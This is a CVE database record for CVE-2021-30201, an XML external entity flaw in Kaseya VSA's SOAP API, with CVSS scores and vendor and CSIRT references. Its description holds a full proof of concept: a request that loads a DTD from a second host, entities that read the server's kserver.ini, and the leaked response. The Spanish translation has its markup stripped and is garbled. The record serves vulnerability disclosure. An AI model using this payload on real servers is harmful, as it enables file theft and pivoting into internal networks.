{"publishedDate": "2021-07-09T14:15Z", "lastModifiedDate": "2024-11-21T06:03Z", "cve": {"data_type": "CVE", "data_format": "MITRE", "data_version": "1.0", "CVE_data_meta": {"ID": "CVE-2021-30201", "ASSIGNER": "cve@mitre.org"}, "description": {"description_data": [{"lang": "en", "value": "The API /vsaWS/KaseyaWS.asmx can be used to submit XML to the system. When this XML is processed (external) entities are insecurely processed and fetched by the system and returned to the attacker. Detailed description Given the following request: ``` POST /vsaWS/KaseyaWS.asmx HTTP/1.1 Content-Type: text/xml;charset=UTF-8 Host: 192.168.1.194:18081 Content-Length: 406 <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:kas=\"KaseyaWS\"> <soapenv:Header/> <soapenv:Body> <kas:PrimitiveResetPassword> <!--type: string--> <kas:XmlRequest><![CDATA[<!DOCTYPE data SYSTEM \"http://192.168.1.170:8080/oob.dtd\"><data>&send;</data>]]> </kas:XmlRequest> </kas:PrimitiveResetPassword> </soapenv:Body> </soapenv:Envelope> ``` And the following XML file hosted at http://192.168.1.170/oob.dtd: ``` <!ENTITY % file SYSTEM \"file://c:\\\\kaseya\\\\kserver\\\\kserver.ini\"> <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\"> %eval; %error; ``` The server will fetch this XML file and process it, it will read the file c:\\\\kaseya\\\\kserver\\\\kserver.ini and returns the content in the server response like below. Response: ``` HTTP/1.1 500 Internal Server Error Cache-Control: private Content-Type: text/xml; charset=utf-8 Date: Fri, 02 Apr 2021 10:07:38 GMT Strict-Transport-Security: max-age=63072000; includeSubDomains Connection: close Content-Length: 2677 <?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><soap:Body><soap:Fault><faultcode>soap:Server</faultcode><faultstring>Server was unable to process request. ---&gt; There is an error in XML document (24, -1000).\\r\\n\\r\\nSystem.Xml.XmlException: Fragment identifier '######################################################################## # This is the configuration file for the KServer. # Place it in the same directory as the KServer executable # A blank line or new valid section header [] terminates each section. # Comment lines start with ; or # ######################################################################## <snip> ``` Security issues discovered --- * The API insecurely resolves external XML entities * The API has an overly verbose error response Impact --- Using this vulnerability an attacker can read any file on the server the webserver process can read. Additionally, it can be used to perform HTTP(s) requests into the local network and thus use the Kaseya system to pivot into the local network."}, {"lang": "es", "value": "La API /vsaWS/KaseyaWS.asmx puede utilizarse para enviar XML al sistema. Cuando este XML es procesado (externo) las entidades son procesadas y obtenidas de forma insegura por el sistema y devueltas al atacante. Descripci\u00f3n detallada Dada la siguiente petici\u00f3n: ``` POST /vsaWS/KaseyaWS.asmx HTTP/1.1 Content-Type: text/xml;charset=UTF-8 Host: 192.168.1.194:18081 Content-Length: 406      &lt;!DOCTYPE data SYSTEM \"http://192.168.1.170:8080/oob. dtd\"&gt;&lt;data&gt;&amp;send;&lt;/data&gt;     ``` Y el siguiente archivo XML alojado en http://192.168.1.170/oob.dtd: ```  \"&gt; %eval; %error; ``` El servidor obtendr\u00e1 este archivo XML y lo procesar\u00e1, leer\u00e1 el archivo c:\\kaseya\\kserver\\kserver.ini y devolver\u00e1 el contenido en la respuesta del servidor como se indica a continuaci\u00f3n. Respuesta: ``` HTTP/1.1 500 Internal Server Error Cache-Control: private Content-Type: text/xml; charset=utf-8 Date: Fri, 02 Apr 2021 10:07:38 GMT Strict-Transport-Security: max-age=63072000; includeSubDomains Connection: close Content-Length: 2677 soap:ServerEl servidor no pudo procesar la solicitud. ---Hay un error en el documento XML (24, -1000): Identificador de fragmento '######################################################################## # Este es el archivo de configuraci\u00f3n para el KServer. # Col\u00f3quelo en el mismo directorio que el ejecutable del KServer # Una l\u00ednea en blanco o una nueva cabecera de secci\u00f3n v\u00e1lida [] termina cada secci\u00f3n. # Las l\u00edneas de comentario comienzan con ; o # ########################################################################  ``` Problemas de seguridad descubiertos --- * La API resuelve de forma insegura entidades XML externas * La API tiene una respuesta de error demasiado verbosa Impacto --- Usando esta vulnerabilidad un atacante puede leer cualquier archivo en el servidor que el proceso del servidor web pueda leer. Adem\u00e1s, puede ser utilizado para realizar solicitudes HTTP(s) en la red local y as\u00ed utilizar el sistema Kaseya para pivotar en la red local"}]}, "references": {"reference_data": [{"url": "https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/", "name": "", "refsource": "", "tags": ["Patch", "Third Party Advisory"]}, {"url": "https://csirt.divd.nl/CVE-2021-30201", "name": "", "refsource": "", "tags": ["Exploit", "Third Party Advisory"]}, {"url": "https://csirt.divd.nl/DIVD-2021-00011", "name": "", "refsource": "", "tags": ["Patch", "Third Party Advisory"]}, {"url": "https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021", "name": "", "refsource": "", "tags": ["Release Notes", "Vendor Advisory"]}, {"url": "https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/", "name": "", "refsource": "", "tags": ["Patch", "Third Party Advisory"]}, {"url": "https://csirt.divd.nl/CVE-2021-30201", "name": "", "refsource": "", "tags": ["Exploit", "Third Party Advisory"]}, {"url": "https://csirt.divd.nl/DIVD-2021-00011", "name": "", "refsource": "", "tags": ["Patch", "Third Party Advisory"]}, {"url": "https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021", "name": "", "refsource": "", "tags": ["Release Notes", "Vendor Advisory"]}]}, "problemtype": {"problemtype_data": [{"description": [{"lang": "en", "value": "CWE-611"}]}]}}, "impact": {"baseMetricV2": {"cvssV2": {"version": "2.0", "vectorString": "AV:N/AC:L/Au:N/C:P/I:N/A:N", "baseScore": 5.0, "accessVector": "NETWORK", "accessComplexity": "LOW", "authentication": "NONE", "confidentialityImpact": "PARTIAL", "integrityImpact": "NONE", "availabilityImpact": "NONE"}, "exploitabilityScore": 10.0, "impactScore": 2.9, "severity": "MEDIUM", "obtainAllPrivilege": false, "obtainUserPrivilege": false, "obtainOtherPrivilege": false, "userInteractionRequired": false}, "baseMetricV3": {"exploitabilityScore": 3.9, "impactScore": 3.6, "cvssV3": {"version": "3.1", "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "baseScore": 7.5, "baseSeverity": "HIGH", "attackVector": "NETWORK", "attackComplexity": "LOW", "privilegesRequired": "NONE", "userInteraction": "NONE", "scope": "UNCHANGED", "confidentialityImpact": "HIGH", "integrityImpact": "NONE", "availabilityImpact": "NONE"}}}, "configurations": {"CVE_data_version": "4.0", "nodes": [{"operator": "OR", "negate": false, "children": [], "cpe_match": [{"vulnerable": true, "cpe23Uri": "cpe:2.3:a:kaseya:vsa:*:*:*:*:-:*:*:*", "matchCriteriaId": "3A890109-5AD9-4684-A46D-A80D6A5F1834", "cpe_name": [], "versionEndExcluding": "9.5.6"}]}]}}